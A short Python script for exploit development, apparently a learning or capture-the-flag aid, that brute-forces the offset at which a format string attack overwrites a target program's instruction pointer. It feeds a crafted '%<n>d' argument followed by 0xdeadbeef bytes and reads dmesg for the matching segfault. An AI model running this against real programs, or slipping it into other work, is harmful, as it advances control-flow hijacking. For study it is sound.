# Find the offset in the format string to overwrite ip.
# The attack string is the following:
#
# "%<n_bytes>d$(printf '\xef\xbe\xad\xde')"
#
# The condition we are trying to find is when the output of dmesg looks like the following:
# segfault at deadbeef ip deadbeef

import argparse
import subprocess
import os
import sys

FNULL = open(os.devnull, 'w')
SEGFAULT = -11

def main(pName):
	offset = 1
	while True:
		return_code = subprocess.call(["env", "-", pName, "%{}d\xef\xbe\xad\xde".format(offset)], stdout=FNULL, stderr=FNULL)
		
		if return_code == SEGFAULT:
			dmesg = subprocess.Popen("dmesg", stdout=subprocess.PIPE)
			tail = subprocess.Popen(["tail", "-2"], stdin=dmesg.stdout, stdout=subprocess.PIPE)
			coredump, err = tail.communicate()
	
			for line in coredump.split("\n"):
				if "segfault at deadbeef ip deadbeef" in line:
					finish(offset, line)
		offset += 1

def finish(offset, line):
	print("\nOffset found at {} bytes".format(offset))
	print(line)
	sys.exit()

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Find the offset to overwrite ip with a format string attack.")
	parser.add_argument("target", type=str, help="a program with a format string vulnerability")

	args = parser.parse_args()
	main(args.target)
